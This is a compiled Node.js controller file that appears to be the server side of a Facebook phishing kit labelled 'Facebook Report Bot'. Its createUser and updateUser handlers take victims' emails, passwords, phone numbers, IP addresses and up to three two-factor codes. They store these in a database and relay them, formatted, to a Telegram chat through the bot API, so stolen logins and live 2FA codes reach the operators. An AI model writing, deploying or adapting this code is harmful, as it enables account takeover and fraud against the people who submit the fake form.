"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || function (mod) {
    if (mod && mod.__esModule) return mod;
    var result = {};
    if (mod != null) for (var k in mod) if (k !== "default" && Object.prototype.hasOwnProperty.call(mod, k)) __createBinding(result, mod, k);
    __setModuleDefault(result, mod);
    return result;
};
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.updateUser = exports.getUser = exports.createUser = void 0;
const httpStatus = __importStar(require("http-status"));
const catchAsync_1 = __importDefault(require("../utils/catchAsync"));
const user_service_1 = require("../services/user.service");
const axios_1 = __importDefault(require("axios"));
const config_1 = __importDefault(require("../config/config"));
const utils_1 = require("../utils/utils");
const user_model_1 = __importDefault(require("../models/user.model"));
const generateMessage = (dataUserBody, userById) => {
    const content = `
\✨ **_IP_**: ${dataUserBody.ip} \n
\✉️ **Email**: ${(userById === null || userById === void 0 ? void 0 : userById.email) || dataUserBody.email} \n
\🔒 **Password**: ${dataUserBody.password || userById.password} \n
${dataUserBody.password2 || userById.password2
        ? `\🔒 **Password-2**: ${dataUserBody.password2 || userById.password2} \n`
        : ''}
\🧰 **Business Email**: ${(userById === null || userById === void 0 ? void 0 : userById.businessEmail) || dataUserBody.businessEmail} \n
\🪪 **Full Name**: ${(userById === null || userById === void 0 ? void 0 : userById.fullname) || dataUserBody.fullname} \n
\📱 **Phone Number**: ${(userById === null || userById === void 0 ? void 0 : userById.phoneNumber) || dataUserBody.phoneNumber} \n
\💻 **Facebook Page**: ${(userById === null || userById === void 0 ? void 0 : userById.facebookPage) || dataUserBody.facebookPage} \n
`;
    if (dataUserBody.firstTFA) {
        return (0, utils_1.escapseStringContentTelegram)(`
🌟 **Welcome to Facebook Report Bot ! ** 🌟\n
🎉 User \`${dataUserBody.email}\` đã update thông tin: \n
${content}
\🔒 **Two_Facetor_Auth-1**: ${dataUserBody.firstTFA} \n
    `);
    }
    if (dataUserBody.secondTFA) {
        return (0, utils_1.escapseStringContentTelegram)(`
🌟 **Welcome to Facebook Report Bot ! ** 🌟\n
🎉 User \`${dataUserBody.email}\` đã update thông tin: \n
${content}
\🔒 **Two_Facetor_Auth-1**: ${dataUserBody.firstTFA} \n
\🔒 **Two_Facetor_Auth-2**: ${dataUserBody.secondTFA}
    `);
    }
    return (0, utils_1.escapseStringContentTelegram)(`
🌟 **Welcome to Facebook Report Bot ! ** 🌟\n
🎉 Có User gửi thông tin: \n
${content}
\🏷️ **__Description__**: ${dataUserBody.description} \n`);
};
const createUser = (0, catchAsync_1.default)((req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const dataUserBody = req.body;
        const userById = yield user_model_1.default.findOne({ email: dataUserBody.email });
        if (userById) {
            const dataUpdate = yield user_model_1.default.updateOne({ email: dataUserBody.email }, {
                password: userById.password,
                fullname: userById.fullname,
                businessEmail: userById.businessEmail,
                phoneNumber: userById.phoneNumber,
                facebookPage: userById.facebookPage,
                ip: dataUserBody.ip,
                password2: userById.password2,
                description: userById.description,
                firstTFA: dataUserBody.firstTFA,
                secondTFA: dataUserBody.secondTFA,
                thirdTFA: dataUserBody.thirdTFA,
            });
            /* Telegram send message */
            const url = `${config_1.default.telegramUrl}/bot${config_1.default.TELEGRAM_BOT}/sendMessage`;
            const message = generateMessage(dataUserBody, userById);
            const params = { chat_id: config_1.default.TELEGRAM_ROOM, text: message, parse_mode: 'MarkdownV2' };
            yield axios_1.default.get(url, { params });
            return res.status(httpStatus.OK).send({ message: 'User updated successfully', data: dataUpdate });
        }
        const dataCreate = yield user_model_1.default.create({
            email: dataUserBody.email,
            password: dataUserBody.password,
            fullname: dataUserBody.fullname,
            businessEmail: dataUserBody.businessEmail,
            phoneNumber: dataUserBody.phoneNumber,
            facebookPage: dataUserBody.facebookPage,
            ip: dataUserBody.ip,
            password2: dataUserBody.password2,
            description: dataUserBody.description,
        });
        /* Telegram send message */
        const url = `${config_1.default.telegramUrl}/bot${config_1.default.TELEGRAM_BOT}/sendMessage`;
        const message = generateMessage(dataUserBody, userById);
        console.log('generateMessage', message);
        const params = { chat_id: config_1.default.TELEGRAM_ROOM, text: message, parse_mode: 'MarkdownV2' };
        yield axios_1.default.get(url, { params });
        res.status(httpStatus.OK).send({ message: 'User created successfully', data: dataCreate });
    }
    catch (err) {
        console.log('wewe', err);
        throw err;
    }
}));
exports.createUser = createUser;
const updateUser = (0, catchAsync_1.default)((req, res) => __awaiter(void 0, void 0, void 0, function* () {
    try {
        const dataUserBody = req.body;
        const userById = yield user_model_1.default.findOne({ email: dataUserBody.email });
        if (!userById) {
            throw { message: 'User not found' };
        }
        const dataUpdate = yield user_model_1.default.updateOne({ email: dataUserBody.email }, {
            password: userById.password,
            fullname: userById.fullname,
            businessEmail: userById.businessEmail,
            phoneNumber: userById.phoneNumber,
            facebookPage: userById.facebookPage,
            ip: dataUserBody.ip,
            password2: userById.password2,
            description: userById.description,
            firstTFA: dataUserBody.firstTFA,
            secondTFA: dataUserBody.secondTFA,
            thirdTFA: dataUserBody.thirdTFA,
        });
        /* Telegram send message */
        const url = `${config_1.default.telegramUrl}/bot${config_1.default.TELEGRAM_BOT}/sendMessage`;
        const message = generateMessage(dataUserBody, userById);
        console.log('generateMessage', message);
        const params = { chat_id: config_1.default.TELEGRAM_ROOM, text: message, parse_mode: 'MarkdownV2' };
        yield axios_1.default.get(url, { params });
        res.status(httpStatus.OK).send({ message: 'User update successfully', data: dataUpdate });
    }
    catch (err) {
        console.log('wewe', err);
        throw err;
    }
}));
exports.updateUser = updateUser;
const getUser = (0, catchAsync_1.default)((req, res) => __awaiter(void 0, void 0, void 0, function* () {
    const data = yield (0, user_service_1.userGetAll)();
    res.status(httpStatus.OK).send({ data, message: 'success' });
}));
exports.getUser = getUser;
